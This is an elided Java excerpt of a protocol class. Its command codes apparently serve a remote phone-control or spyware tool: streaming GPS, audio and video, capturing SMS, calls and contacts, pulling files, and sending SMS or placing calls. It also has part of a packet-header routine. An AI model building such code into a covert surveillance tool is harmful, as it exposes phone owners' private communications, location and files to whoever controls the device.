...
public class Protocol {
	...
	public final static short GET_GPS_STREAM = (short) (P_INST + 1);
	public final static short STOP_GPS_STREAM = (short) (P_INST + 2);

	public final static short GET_PICTURE = (short) (P_INST + 3);
	public final static short GET_PICTURE1 = (short) (P_INST + 3);

	public final static short GET_SOUND_STREAM = (short) (P_INST + 4);
	public final static short STOP_SOUND_STREAM = (short) (P_INST + 5);

	public final static short GET_VIDEO_STREAM = (short) (P_INST + 6);
	public final static short STOP_VIDEO_STREAM = (short) (P_INST + 7);

	public final static short GET_BASIC_INFO = (short) (P_INST + 8);
	public final static short DO_TOAST = (short) (P_INST + 9);
	public final static short MONITOR_SMS = (short) (P_INST + 10);
	public final static short MONITOR_CALL = (short) (P_INST + 11);
	public final static short GET_CONTACTS = (short) (P_INST + 12);
	public final static short GET_SMS = (short) (P_INST + 13);
	public final static short LIST_DIR = (short) (P_INST + 14);
	public final static short GET_FILE = (short) (P_INST + 15);
	public final static short GIVE_CALL = (short) (P_INST + 16);
	public final static short SEND_SMS = (short) (P_INST + 17);
	...
	public final static short GET_CONSUMED_DATA = (short) (P_INST + 22);
	public final static short DO_VIBRATE = (short) (P_INST + 23);
	...
	public static byte[] dataHeaderGenerator(int totalLenght, int localLength, boolean moreF, short idPaquet,
			int channel) {
		...
		System.arraycopy(bytePointeurData, 0, header,
				byteTotalLength.length + byteLocalLength.length + byteMoreF.length, bytePointeurData.length);
		System.arraycopy(byteChannel, 0, header,
				byteTotalLength.length + byteLocalLength.length + byteMoreF.length + bytePointeurData.length,
				byteChannel.length);
